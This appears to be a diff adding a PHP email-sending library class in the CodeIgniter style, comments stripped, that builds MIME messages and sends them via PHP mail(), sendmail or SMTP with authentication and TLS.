+public function set_protocol($protocol = 'mail')
+{
+$this->protocol = in_array($protocol, $this->_protocols, TRUE) ? strtolower($protocol) : 'mail';
+return $this;
+}
+
+
+
+
+
+
+
+public function set_priority($n = 3)
+{
+$this->priority = preg_match('/^[1-5]$/', $n) ? (int) $n : 3;
+return $this;
+}
+
+
+
+
+
+
+
+public function set_newline($newline = "\n")
+{
+$this->newline = in_array($newline, array("\n", "\r\n", "\r")) ? $newline : "\n";
+return $this;
+}
+
+
+
+
+
+
+
+public function set_crlf($crlf = "\n")
+{
+$this->crlf = ($crlf !== "\n" && $crlf !== "\r\n" && $crlf !== "\r") ? "\n" : $crlf;
+return $this;
+}
+
+
+
+
+
+
+protected function _get_message_id()
+{
+$from = str_replace(array('>', '<'), '', $this->_headers['Return-Path']);
+return '<'.uniqid('').strstr($from, '@').'>';
+}
+
+
+
+
+
+
+protected function _get_protocol()
+{
+$this->protocol = strtolower($this->protocol);
+in_array($this->protocol, $this->_protocols, TRUE) OR $this->protocol = 'mail';
+return $this->protocol;
+}
+
+
+
+
+
+
+protected function _get_encoding()
+{
+in_array($this->_encoding, $this->_bit_depths) OR $this->_encoding = '8bit';
+foreach ($this->_base_charsets as $charset)
+{
+if (strpos($this->charset, $charset) === 0)
+{
+$this->_encoding = '7bit';
+}
+}
+return $this->_encoding;
+}
+
+
+
+
+
+
+protected function _get_content_type()
+{
+if ($this->mailtype === 'html')
+{
+return empty($this->_attachments) ? 'html' : 'html-attach';
+}
+elseif ($this->mailtype === 'text' && ! empty($this->_attachments))
+{
+return 'plain-attach';
+}
+return 'plain';
+}
+
+
+
+
+
+
+protected function _set_date()
+{
+$timezone = date('Z');
+$operator = ($timezone[0] === '-') ? '-' : '+';
+$timezone = abs($timezone);
+$timezone = floor($timezone/3600) * 100 + ($timezone % 3600) / 60;
+return sprintf('%s %s%04d', date('D, j M Y H:i:s'), $operator, $timezone);
+}
+
+
+
+
+
+
+protected function _get_mime_message()
+{
+return 'This is a multi-part message in MIME format.'.$this->newline.'Your email application may not support this format.';
+}
+
+
+
+
+
+
+
+public function validate_email($email)
+{
+if ( ! is_array($email))
+{
+$this->_set_error_message('lang:email_must_be_array');
+return FALSE;
+}
+foreach ($email as $val)
+{
+if ( ! $this->valid_email($val))
+{
+$this->_set_error_message('lang:email_invalid_address', $val);
+return FALSE;
+}
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+public function valid_email($email)
+{
+if (function_exists('idn_to_ascii') && strpos($email, '@'))
+{
+list($account, $domain) = explode('@', $email, 2);
+$domain = defined('INTL_IDNA_VARIANT_UTS46')
+? idn_to_ascii($domain, 0, INTL_IDNA_VARIANT_UTS46)
+: idn_to_ascii($domain);
+if ($domain !== FALSE)
+{
+$email = $account.'@'.$domain;
+}
+}
+return (bool) filter_var($email, FILTER_VALIDATE_EMAIL);
+}
+
+
+
+
+
+
+
+public function clean_email($email)
+{
+if ( ! is_array($email))
+{
+return preg_match('/\<(.*)\>/', $email, $match) ? $match[1] : $email;
+}
+$clean_email = array();
+foreach ($email as $addy)
+{
+$clean_email[] = preg_match('/\<(.*)\>/', $addy, $match) ? $match[1] : $addy;
+}
+return $clean_email;
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _get_alt_message()
+{
+if ( ! empty($this->alt_message))
+{
+return ($this->wordwrap)
+? $this->word_wrap($this->alt_message, 76)
+: $this->alt_message;
+}
+$body = preg_match('/\<body.*?\>(.*)\<\/body\>/si', $this->_body, $match) ? $match[1] : $this->_body;
+$body = str_replace("\t", '', preg_replace('#<!--(.*)--\>#', '', trim(strip_tags($body))));
+for ($i = 20; $i >= 3; $i--)
+{
+$body = str_replace(str_repeat("\n", $i), "\n\n", $body);
+}
+
+$body = preg_replace('| +|', ' ', $body);
+return ($this->wordwrap)
+? $this->word_wrap($body, 76)
+: $body;
+}
+
+
+
+
+
+
+
+
+public function word_wrap($str, $charlim = NULL)
+{
+
+if (empty($charlim))
+{
+$charlim = empty($this->wrapchars) ? 76 : $this->wrapchars;
+}
+
+if (strpos($str, "\r") !== FALSE)
+{
+$str = str_replace(array("\r\n", "\r"), "\n", $str);
+}
+
+$str = preg_replace('| +\n|', "\n", $str);
+
+
+$unwrap = array();
+if (preg_match_all('|\{unwrap\}(.+?)\{/unwrap\}|s', $str, $matches))
+{
+for ($i = 0, $c = count($matches[0]); $i < $c; $i++)
+{
+$unwrap[] = $matches[1][$i];
+$str = str_replace($matches[0][$i], '{{unwrapped'.$i.'}}', $str);
+}
+}
+
+
+
+$str = wordwrap($str, $charlim, "\n", FALSE);
+
+$output = '';
+foreach (explode("\n", $str) as $line)
+{
+
+
+if (self::strlen($line) <= $charlim)
+{
+$output .= $line.$this->newline;
+continue;
+}
+$temp = '';
+do
+{
+
+if (preg_match('!\[url.+\]|://|www\.!', $line))
+{
+break;
+}
+
+$temp .= self::substr($line, 0, $charlim - 1);
+$line = self::substr($line, $charlim - 1);
+}
+while (self::strlen($line) > $charlim);
+
+
+if ($temp !== '')
+{
+$output .= $temp.$this->newline;
+}
+$output .= $line.$this->newline;
+}
+
+if (count($unwrap) > 0)
+{
+foreach ($unwrap as $key => $val)
+{
+$output = str_replace('{{unwrapped'.$key.'}}', $val, $output);
+}
+}
+return $output;
+}
+
+
+
+
+
+
+protected function _build_headers()
+{
+$this->set_header('User-Agent', $this->useragent);
+$this->set_header('X-Sender', $this->clean_email($this->_headers['From']));
+$this->set_header('X-Mailer', $this->useragent);
+$this->set_header('X-Priority', $this->_priorities[$this->priority]);
+$this->set_header('Message-ID', $this->_get_message_id());
+$this->set_header('Mime-Version', '1.0');
+}
+
+
+
+
+
+
+protected function _write_headers()
+{
+if ($this->protocol === 'mail')
+{
+if (isset($this->_headers['Subject']))
+{
+$this->_subject = $this->_headers['Subject'];
+unset($this->_headers['Subject']);
+}
+}
+reset($this->_headers);
+$this->_header_str = '';
+foreach ($this->_headers as $key => $val)
+{
+$val = trim($val);
+if ($val !== '')
+{
+$this->_header_str .= $key.': '.$val.$this->newline;
+}
+}
+if ($this->_get_protocol() === 'mail')
+{
+$this->_header_str = rtrim($this->_header_str);
+}
+}
+
+
+
+
+
+
+protected function _build_message()
+{
+if ($this->wordwrap === TRUE && $this->mailtype !== 'html')
+{
+$this->_body = $this->word_wrap($this->_body);
+}
+$this->_write_headers();
+$hdr = ($this->_get_protocol() === 'mail') ? $this->newline : '';
+$body = '';
+switch ($this->_get_content_type())
+{
+case 'plain':
+$hdr .= 'Content-Type: text/plain; charset='.$this->charset.$this->newline
+.'Content-Transfer-Encoding: '.$this->_get_encoding();
+if ($this->_get_protocol() === 'mail')
+{
+$this->_header_str .= $hdr;
+$this->_finalbody = $this->_body;
+}
+else
+{
+$this->_finalbody = $hdr.$this->newline.$this->newline.$this->_body;
+}
+return;
+case 'html':
+if ($this->send_multipart === FALSE)
+{
+$hdr .= 'Content-Type: text/html; charset='.$this->charset.$this->newline
+.'Content-Transfer-Encoding: quoted-printable';
+}
+else
+{
+$boundary = uniqid('B_ALT_');
+$hdr .= 'Content-Type: multipart/alternative; boundary="'.$boundary.'"';
+$body .= $this->_get_mime_message().$this->newline.$this->newline
+.'--'.$boundary.$this->newline
+.'Content-Type: text/plain; charset='.$this->charset.$this->newline
+.'Content-Transfer-Encoding: '.$this->_get_encoding().$this->newline.$this->newline
+.$this->_get_alt_message().$this->newline.$this->newline
+.'--'.$boundary.$this->newline
+.'Content-Type: text/html; charset='.$this->charset.$this->newline
+.'Content-Transfer-Encoding: quoted-printable'.$this->newline.$this->newline;
+}
+$this->_finalbody = $body.$this->_prep_quoted_printable($this->_body).$this->newline.$this->newline;
+if ($this->_get_protocol() === 'mail')
+{
+$this->_header_str .= $hdr;
+}
+else
+{
+$this->_finalbody = $hdr.$this->newline.$this->newline.$this->_finalbody;
+}
+if ($this->send_multipart !== FALSE)
+{
+$this->_finalbody .= '--'.$boundary.'--';
+}
+return;
+case 'plain-attach':
+$boundary = uniqid('B_ATC_');
+$hdr .= 'Content-Type: multipart/mixed; boundary="'.$boundary.'"';
+if ($this->_get_protocol() === 'mail')
+{
+$this->_header_str .= $hdr;
+}
+$body .= $this->_get_mime_message().$this->newline
+.$this->newline
+.'--'.$boundary.$this->newline
+.'Content-Type: text/plain; charset='.$this->charset.$this->newline
+.'Content-Transfer-Encoding: '.$this->_get_encoding().$this->newline
+.$this->newline
+.$this->_body.$this->newline.$this->newline;
+$this->_append_attachments($body, $boundary);
+break;
+case 'html-attach':
+$alt_boundary = uniqid('B_ALT_');
+$last_boundary = NULL;
+if ($this->_attachments_have_multipart('mixed'))
+{
+$atc_boundary = uniqid('B_ATC_');
+$hdr .= 'Content-Type: multipart/mixed; boundary="'.$atc_boundary.'"';
+$last_boundary = $atc_boundary;
+}
+if ($this->_attachments_have_multipart('related'))
+{
+$rel_boundary = uniqid('B_REL_');
+$rel_boundary_header = 'Content-Type: multipart/related; boundary="'.$rel_boundary.'"';
+if (isset($last_boundary))
+{
+$body .= '--'.$last_boundary.$this->newline.$rel_boundary_header;
+}
+else
+{
+$hdr .= $rel_boundary_header;
+}
+$last_boundary = $rel_boundary;
+}
+if ($this->_get_protocol() === 'mail')
+{
+$this->_header_str .= $hdr;
+}
+self::strlen($body) && $body .= $this->newline.$this->newline;
+$body .= $this->_get_mime_message().$this->newline.$this->newline
+.'--'.$last_boundary.$this->newline
+.'Content-Type: multipart/alternative; boundary="'.$alt_boundary.'"'.$this->newline.$this->newline
+.'--'.$alt_boundary.$this->newline
+.'Content-Type: text/plain; charset='.$this->charset.$this->newline
+.'Content-Transfer-Encoding: '.$this->_get_encoding().$this->newline.$this->newline
+.$this->_get_alt_message().$this->newline.$this->newline
+.'--'.$alt_boundary.$this->newline
+.'Content-Type: text/html; charset='.$this->charset.$this->newline
+.'Content-Transfer-Encoding: quoted-printable'.$this->newline.$this->newline
+.$this->_prep_quoted_printable($this->_body).$this->newline.$this->newline
+.'--'.$alt_boundary.'--'.$this->newline.$this->newline;
+if ( ! empty($rel_boundary))
+{
+$body .= $this->newline.$this->newline;
+$this->_append_attachments($body, $rel_boundary, 'related');
+}
+
+if ( ! empty($atc_boundary))
+{
+$body .= $this->newline.$this->newline;
+$this->_append_attachments($body, $atc_boundary, 'mixed');
+}
+break;
+}
+$this->_finalbody = ($this->_get_protocol() === 'mail')
+? $body
+: $hdr.$this->newline.$this->newline.$body;
+return TRUE;
+}
+
+protected function _attachments_have_multipart($type)
+{
+foreach ($this->_attachments as &$attachment)
+{
+if ($attachment['multipart'] === $type)
+{
+return TRUE;
+}
+}
+return FALSE;
+}
+
+
+
+
+
+
+
+
+
+protected function _append_attachments(&$body, $boundary, $multipart = null)
+{
+for ($i = 0, $c = count($this->_attachments); $i < $c; $i++)
+{
+if (isset($multipart) && $this->_attachments[$i]['multipart'] !== $multipart)
+{
+continue;
+}
+$name = isset($this->_attachments[$i]['name'][1])
+? $this->_attachments[$i]['name'][1]
+: basename($this->_attachments[$i]['name'][0]);
+$body .= '--'.$boundary.$this->newline
+.'Content-Type: '.$this->_attachments[$i]['type'].'; name="'.$name.'"'.$this->newline
+.'Content-Disposition: '.$this->_attachments[$i]['disposition'].';'.$this->newline
+.'Content-Transfer-Encoding: base64'.$this->newline
+.(empty($this->_attachments[$i]['cid']) ? '' : 'Content-ID: <'.$this->_attachments[$i]['cid'].'>'.$this->newline)
+.$this->newline
+.$this->_attachments[$i]['content'].$this->newline;
+}
+
+
+empty($name) OR $body .= '--'.$boundary.'--';
+}
+
+
+
+
+
+
+
+
+
+
+protected function _prep_quoted_printable($str)
+{
+
+
+
+static $ascii_safe_chars = array(
+
+39, 40, 41, 43, 44, 45, 46, 47, 58, 61, 63,
+
+48, 49, 50, 51, 52, 53, 54, 55, 56, 57,
+
+65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90,
+
+97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122
+);
+
+
+$str = str_replace(array('{unwrap}', '{/unwrap}'), '', $str);
+
+
+
+
+if ($this->crlf === "\r\n")
+{
+return quoted_printable_encode($str);
+}
+
+$str = preg_replace(array('| +|', '/\x00+/'), array(' ', ''), $str);
+
+if (strpos($str, "\r") !== FALSE)
+{
+$str = str_replace(array("\r\n", "\r"), "\n", $str);
+}
+$escape = '=';
+$output = '';
+foreach (explode("\n", $str) as $line)
+{
+$length = self::strlen($line);
+$temp = '';
+
+
+
+for ($i = 0; $i < $length; $i++)
+{
+
+$char = $line[$i];
+$ascii = ord($char);
+
+if ($ascii === 32 OR $ascii === 9)
+{
+if ($i === ($length - 1))
+{
+$char = $escape.sprintf('%02s', dechex($ascii));
+}
+}
+
+
+
+
+elseif ($ascii === 61)
+{
+$char = $escape.strtoupper(sprintf('%02s', dechex($ascii))); 
+}
+elseif ( ! in_array($ascii, $ascii_safe_chars, TRUE))
+{
+$char = $escape.strtoupper(sprintf('%02s', dechex($ascii)));
+}
+
+
+if ((self::strlen($temp) + self::strlen($char)) >= 76)
+{
+$output .= $temp.$escape.$this->crlf;
+$temp = '';
+}
+
+$temp .= $char;
+}
+
+$output .= $temp.$this->crlf;
+}
+
+return self::substr($output, 0, self::strlen($this->crlf) * -1);
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _prep_q_encoding($str)
+{
+$str = str_replace(array("\r", "\n"), '', $str);
+if ($this->charset === 'UTF-8')
+{
+
+
+
+if (ICONV_ENABLED === TRUE)
+{
+$output = @iconv_mime_encode('', $str,
+array(
+'scheme' => 'Q',
+'line-length' => 76,
+'input-charset' => $this->charset,
+'output-charset' => $this->charset,
+'line-break-chars' => $this->crlf
+)
+);
+
+if ($output !== FALSE)
+{
+
+
+
+return self::substr($output, 2);
+}
+$chars = iconv_strlen($str, 'UTF-8');
+}
+elseif (MB_ENABLED === TRUE)
+{
+$chars = mb_strlen($str, 'UTF-8');
+}
+}
+
+isset($chars) OR $chars = self::strlen($str);
+$output = '=?'.$this->charset.'?Q?';
+for ($i = 0, $length = self::strlen($output); $i < $chars; $i++)
+{
+$chr = ($this->charset === 'UTF-8' && ICONV_ENABLED === TRUE)
+? '='.implode('=', str_split(strtoupper(bin2hex(iconv_substr($str, $i, 1, $this->charset))), 2))
+: '='.strtoupper(bin2hex($str[$i]));
+
+
+if ($length + ($l = self::strlen($chr)) > 74)
+{
+$output .= '?='.$this->crlf 
+.' =?'.$this->charset.'?Q?'.$chr; 
+$length = 6 + self::strlen($this->charset) + $l; 
+}
+else
+{
+$output .= $chr;
+$length += $l;
+}
+}
+
+return $output.'?=';
+}
+
+
+
+
+
+
+
+public function send($auto_clear = TRUE)
+{
+if ( ! isset($this->_headers['From']))
+{
+$this->_set_error_message('lang:email_no_from');
+return FALSE;
+}
+if ($this->_replyto_flag === FALSE)
+{
+$this->reply_to($this->_headers['From']);
+}
+if ( ! isset($this->_recipients) && ! isset($this->_headers['To'])
+&& ! isset($this->_bcc_array) && ! isset($this->_headers['Bcc'])
+&& ! isset($this->_headers['Cc']))
+{
+$this->_set_error_message('lang:email_no_recipients');
+return FALSE;
+}
+$this->_build_headers();
+if ($this->bcc_batch_mode && count($this->_bcc_array) > $this->bcc_batch_size)
+{
+$result = $this->batch_bcc_send();
+if ($result && $auto_clear)
+{
+$this->clear();
+}
+return $result;
+}
+if ($this->_build_message() === FALSE)
+{
+return FALSE;
+}
+$result = $this->_spool_email();
+if ($result && $auto_clear)
+{
+$this->clear();
+}
+return $result;
+}
+
+
+
+
+
+
+public function batch_bcc_send()
+{
+$float = $this->bcc_batch_size - 1;
+$set = '';
+$chunk = array();
+for ($i = 0, $c = count($this->_bcc_array); $i < $c; $i++)
+{
+if (isset($this->_bcc_array[$i]))
+{
+$set .= ', '.$this->_bcc_array[$i];
+}
+if ($i === $float)
+{
+$chunk[] = self::substr($set, 1);
+$float += $this->bcc_batch_size;
+$set = '';
+}
+if ($i === $c-1)
+{
+$chunk[] = self::substr($set, 1);
+}
+}
+for ($i = 0, $c = count($chunk); $i < $c; $i++)
+{
+unset($this->_headers['Bcc']);
+$bcc = $this->clean_email($this->_str_to_array($chunk[$i]));
+if ($this->protocol !== 'smtp')
+{
+$this->set_header('Bcc', implode(', ', $bcc));
+}
+else
+{
+$this->_bcc_array = $bcc;
+}
+if ($this->_build_message() === FALSE)
+{
+return FALSE;
+}
+$this->_spool_email();
+}
+}
+
+
+
+
+
+
+protected function _unwrap_specials()
+{
+$this->_finalbody = preg_replace_callback('/\{unwrap\}(.*?)\{\/unwrap\}/si', array($this, '_remove_nl_callback'), $this->_finalbody);
+}
+
+
+
+
+
+
+
+protected function _remove_nl_callback($matches)
+{
+if (strpos($matches[1], "\r") !== FALSE OR strpos($matches[1], "\n") !== FALSE)
+{
+$matches[1] = str_replace(array("\r\n", "\r", "\n"), '', $matches[1]);
+}
+return $matches[1];
+}
+
+
+
+
+
+
+protected function _spool_email()
+{
+$this->_unwrap_specials();
+$protocol = $this->_get_protocol();
+$method = '_send_with_'.$protocol;
+if ( ! $this->$method())
+{
+$this->_set_error_message('lang:email_send_failure_'.($protocol === 'mail' ? 'phpmail' : $protocol));
+return FALSE;
+}
+$this->_set_error_message('lang:email_sent', $protocol);
+return TRUE;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _validate_email_for_shell(&$email)
+{
+if (function_exists('idn_to_ascii') && strpos($email, '@'))
+{
+list($account, $domain) = explode('@', $email, 2);
+$domain = defined('INTL_IDNA_VARIANT_UTS46')
+? idn_to_ascii($domain, 0, INTL_IDNA_VARIANT_UTS46)
+: idn_to_ascii($domain);
+if ($domain !== FALSE)
+{
+$email = $account.'@'.$domain;
+}
+}
+return (filter_var($email, FILTER_VALIDATE_EMAIL) === $email && preg_match('#\A[a-z0-9._+-]+@[a-z0-9.-]{1,253}\z#i', $email));
+}
+
+
+
+
+
+
+protected function _send_with_mail()
+{
+if (is_array($this->_recipients))
+{
+$this->_recipients = implode(', ', $this->_recipients);
+}
+
+
+$from = $this->clean_email($this->_headers['Return-Path']);
+if ($this->_safe_mode === TRUE || ! $this->_validate_email_for_shell($from))
+{
+return mail($this->_recipients, $this->_subject, $this->_finalbody, $this->_header_str);
+}
+else
+{
+
+
+return mail($this->_recipients, $this->_subject, $this->_finalbody, $this->_header_str, '-f '.$from);
+}
+}
+
+
+
+
+
+
+protected function _send_with_sendmail()
+{
+
+
+$from = $this->clean_email($this->_headers['From']);
+if ($this->_validate_email_for_shell($from))
+{
+$from = '-f '.$from;
+}
+else
+{
+$from = '';
+}
+
+if ( ! function_usable('popen') OR FALSE === ($fp = @popen($this->mailpath.' -oi '.$from.' -t', 'w')))
+{
+
+return FALSE;
+}
+fputs($fp, $this->_header_str);
+fputs($fp, $this->_finalbody);
+$status = pclose($fp);
+if ($status !== 0)
+{
+$this->_set_error_message('lang:email_exit_status', $status);
+$this->_set_error_message('lang:email_no_socket');
+return FALSE;
+}
+return TRUE;
+}
+
+
+
+
+
+
+protected function _send_with_smtp()
+{
+if ($this->smtp_host === '')
+{
+$this->_set_error_message('lang:email_no_hostname');
+return FALSE;
+}
+if ( ! $this->_smtp_connect() OR ! $this->_smtp_authenticate())
+{
+return FALSE;
+}
+if ( ! $this->_send_command('from', $this->clean_email($this->_headers['From'])))
+{
+$this->_smtp_end();
+return FALSE;
+}
+foreach ($this->_recipients as $val)
+{
+if ( ! $this->_send_command('to', $val))
+{
+$this->_smtp_end();
+return FALSE;
+}
+}
+if (count($this->_cc_array) > 0)
+{
+foreach ($this->_cc_array as $val)
+{
+if ($val !== '' && ! $this->_send_command('to', $val))
+{
+$this->_smtp_end();
+return FALSE;
+}
+}
+}
+if (count($this->_bcc_array) > 0)
+{
+foreach ($this->_bcc_array as $val)
+{
+if ($val !== '' && ! $this->_send_command('to', $val))
+{
+$this->_smtp_end();
+return FALSE;
+}
+}
+}
+if ( ! $this->_send_command('data'))
+{
+$this->_smtp_end();
+return FALSE;
+}
+
+$this->_send_data($this->_header_str.preg_replace('/^\./m', '..$1', $this->_finalbody));
+$this->_send_data('.');
+$reply = $this->_get_smtp_data();
+$this->_set_error_message($reply);
+$this->_smtp_end();
+if (strpos($reply, '250') !== 0)
+{
+$this->_set_error_message('lang:email_smtp_error', $reply);
+return FALSE;
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+
+protected function _smtp_end()
+{
+($this->smtp_keepalive)
+? $this->_send_command('reset')
+: $this->_send_command('quit');
+}
+
+
+
+
+
+
+protected function _smtp_connect()
+{
+if (is_resource($this->_smtp_connect))
+{
+return TRUE;
+}
+$ssl = ($this->smtp_crypto === 'ssl') ? 'ssl://' : '';
+$this->_smtp_connect = fsockopen($ssl.$this->smtp_host,
+$this->smtp_port,
+$errno,
+$errstr,
+$this->smtp_timeout);
+if ( ! is_resource($this->_smtp_connect))
+{
+$this->_set_error_message('lang:email_smtp_error', $errno.' '.$errstr);
+return FALSE;
+}
+stream_set_timeout($this->_smtp_connect, $this->smtp_timeout);
+$this->_set_error_message($this->_get_smtp_data());
+if ($this->smtp_crypto === 'tls')
+{
+$this->_send_command('hello');
+$this->_send_command('starttls');
+
+
+
+
+
+
+
+
+
+$method = is_php('5.6')
+? STREAM_CRYPTO_METHOD_TLSv1_0_CLIENT | STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT | STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT
+: STREAM_CRYPTO_METHOD_TLS_CLIENT;
+$crypto = stream_socket_enable_crypto($this->_smtp_connect, TRUE, $method);
+if ($crypto !== TRUE)
+{
+$this->_set_error_message('lang:email_smtp_error', $this->_get_smtp_data());
+return FALSE;
+}
+}
+return $this->_send_command('hello');
+}
+
+
+
+
+
+
+
+
+protected function _send_command($cmd, $data = '')
+{
+switch ($cmd)
+{
+case 'hello' :
+if ($this->_smtp_auth OR $this->_get_encoding() === '8bit')
+{
+$this->_send_data('EHLO '.$this->_get_hostname());
+}
+else
+{
+$this->_send_data('HELO '.$this->_get_hostname());
+}
+$resp = 250;
+break;
+case 'starttls' :
+$this->_send_data('STARTTLS');
+$resp = 220;
+break;
+case 'from' :
+$this->_send_data('MAIL FROM:<'.$data.'>');
+$resp = 250;
+break;
+case 'to' :
+if ($this->dsn)
+{
+$this->_send_data('RCPT TO:<'.$data.'> NOTIFY=SUCCESS,DELAY,FAILURE ORCPT=rfc822;'.$data);
+}
+else
+{
+$this->_send_data('RCPT TO:<'.$data.'>');
+}
+$resp = 250;
+break;
+case 'data' :
+$this->_send_data('DATA');
+$resp = 354;
+break;
+case 'reset':
+$this->_send_data('RSET');
+$resp = 250;
+break;
+case 'quit' :
+$this->_send_data('QUIT');
+$resp = 221;
+break;
+}
+$reply = $this->_get_smtp_data();
+$this->_debug_msg[] = '<pre>'.$cmd.': '.$reply.'</pre>';
+if ((int) self::substr($reply, 0, 3) !== $resp)
+{
+$this->_set_error_message('lang:email_smtp_error', $reply);
+return FALSE;
+}
+if ($cmd === 'quit')
+{
+fclose($this->_smtp_connect);
+}
+return TRUE;
+}
+
+
+
+
+
+
+protected function _smtp_authenticate()
+{
+if ( ! $this->_smtp_auth)
+{
+return TRUE;
+}
+if ($this->smtp_user === '' && $this->smtp_pass === '')
+{
+$this->_set_error_message('lang:email_no_smtp_unpw');
+return FALSE;
+}
+$this->_send_data('AUTH LOGIN');
+$reply = $this->_get_smtp_data();
+if (strpos($reply, '503') === 0) 
+{
+return TRUE;
+}
+elseif (strpos($reply, '334') !== 0)
+{
+$this->_set_error_message('lang:email_failed_smtp_login', $reply);
+return FALSE;
+}
+$this->_send_data(base64_encode($this->smtp_user));
+$reply = $this->_get_smtp_data();
+if (strpos($reply, '334') !== 0)
+{
+$this->_set_error_message('lang:email_smtp_auth_un', $reply);
+return FALSE;
+}
+$this->_send_data(base64_encode($this->smtp_pass));
+$reply = $this->_get_smtp_data();
+if (strpos($reply, '235') !== 0)
+{
+$this->_set_error_message('lang:email_smtp_auth_pw', $reply);
+return FALSE;
+}
+if ($this->smtp_keepalive)
+{
+$this->_smtp_auth = FALSE;
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+protected function _send_data($data)
+{
+$data .= $this->newline;
+for ($written = $timestamp = 0, $length = self::strlen($data); $written < $length; $written += $result)
+{
+if (($result = fwrite($this->_smtp_connect, self::substr($data, $written))) === FALSE)
+{
+break;
+}
+
+elseif ($result === 0)
+{
+if ($timestamp === 0)
+{
+$timestamp = time();
+}
+elseif ($timestamp < (time() - $this->smtp_timeout))
+{
+$result = FALSE;
+break;
+}
+usleep(250000);
+continue;
+}
+$timestamp = 0;
+}
+if ($result === FALSE)
+{
+$this->_set_error_message('lang:email_smtp_data_failure', $data);
+return FALSE;
+}
+return TRUE;
+}
+
+
+
+
+
+
+protected function _get_smtp_data()
+{
+$data = '';
+while ($str = fgets($this->_smtp_connect, 512))
+{
+$data .= $str;
+if ($str[3] === ' ')
+{
+break;
+}
+}
+return $data;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _get_hostname()
+{
+if (isset($_SERVER['SERVER_NAME']))
+{
+return $_SERVER['SERVER_NAME'];
+}
+return isset($_SERVER['SERVER_ADDR']) ? '['.$_SERVER['SERVER_ADDR'].']' : '[127.0.0.1]';
+}
+
+
+
+
+
+
+
+
+public function print_debugger($include = array('headers', 'subject', 'body'))
+{
+$msg = '';
+if (count($this->_debug_msg) > 0)
+{
+foreach ($this->_debug_msg as $val)
+{
+$msg .= $val;
+}
+}
+
+$raw_data = '';
+is_array($include) OR $include = array($include);
+if (in_array('headers', $include, TRUE))
+{
+$raw_data = htmlspecialchars($this->_header_str)."\n";
+}
+if (in_array('subject', $include, TRUE))
+{
+$raw_data .= htmlspecialchars($this->_subject)."\n";
+}
+if (in_array('body', $include, TRUE))
+{
+$raw_data .= htmlspecialchars($this->_finalbody);
+}
+return $msg.($raw_data === '' ? '' : '<pre>'.$raw_data.'</pre>');
+}
+
+
+
+
+
+
+
+
+protected function _set_error_message($msg, $val = '')
+{
+$CI =& get_instance();
+$CI->lang->load('email');
+if (sscanf($msg, 'lang:%s', $line) !== 1 OR FALSE === ($line = $CI->lang->line($line)))
+{
+$this->_debug_msg[] = str_replace('%s', $val, $msg).'<br />';
+}
+else
+{
+$this->_debug_msg[] = str_replace('%s', $val, $line).'<br />';
+}
+}
+
+
+
+
+
+
+
+protected function _mime_types($ext = '')
+{
+$ext = strtolower($ext);
+$mimes =& get_mimes();
+if (isset($mimes[$ext]))
+{
+return is_array($mimes[$ext])
+? current($mimes[$ext])
+: $mimes[$ext];
+}
+return 'application/x-unknown-content-type';
+}
+
+
+
+
+
+
+public function __destruct()
+{
+is_resource($this->_smtp_connect) && $this->_send_command('quit');
+}
+
+
+
+
+
+
+
+protected static function strlen($str)
+{
+return (self::$func_overload)
+? mb_strlen($str, '8bit')
+: strlen($str);
+}
+
+
+
+
+
+
+
+
+
+protected static function substr($str, $start, $length = NULL)
+{
+if (self::$func_overload)
+{
+
+
+isset($length) OR $length = ($start >= 0 ? self::strlen($str) - $start : -$start);
+return mb_substr($str, $start, $length, '8bit');
+}
+return isset($length)
+? substr($str, $start, $length)
+: substr($str, $start);
+}
+}
